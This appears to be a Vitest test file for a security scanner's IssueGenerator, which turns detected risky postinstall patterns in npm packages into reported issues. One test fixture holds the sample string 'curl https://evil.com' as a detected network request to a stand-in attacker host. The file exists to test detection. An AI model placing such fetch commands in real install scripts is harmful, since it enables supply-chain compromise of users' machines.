import { describe, it, expect } from 'vitest';
import { IssueGenerator } from '../../src/security/IssueGenerator';

describe('IssueGenerator', () => {
  describe('createIssue', () => {
    it('should create issue from script analysis result', () => {
      const generator = new IssueGenerator();
      const result = {
        riskScore: 75,
        severity: 'high' as const,
        patterns: [
          { type: 'network_request' as const, match: 'curl https://evil.com', position: { line: 1, column: 0 } }
        ],
        context: { publishDate: new Date() }
      };
      const context = {
        source: 'package.json' as const,
        file: 'package.json',
        packageName: 'suspicious-package'
      };
      const issue = generator.createIssue(result, context);
      expect(issue).toBeDefined();
      expect(issue.type).toBe('postinstall_risk');
      expect(issue.severity).toBe('high');
      expect(issue.autoFixable).toBe(false);
    });

    it('should format message with package name', () => {
      const generator = new IssueGenerator();
      const result = {
        riskScore: 50,
        severity: 'medium' as const,
        patterns: [],
        context: {}
      };
      const context = {
        source: 'dependency' as const,
        file: 'node_modules/pkg/package.json',
        packageName: 'test-package'
      };
      const issue = generator.createIssue(result, context);
      expect(issue.message).toContain('test-package');
      expect(issue.message).toContain('50');
    });
  });
});
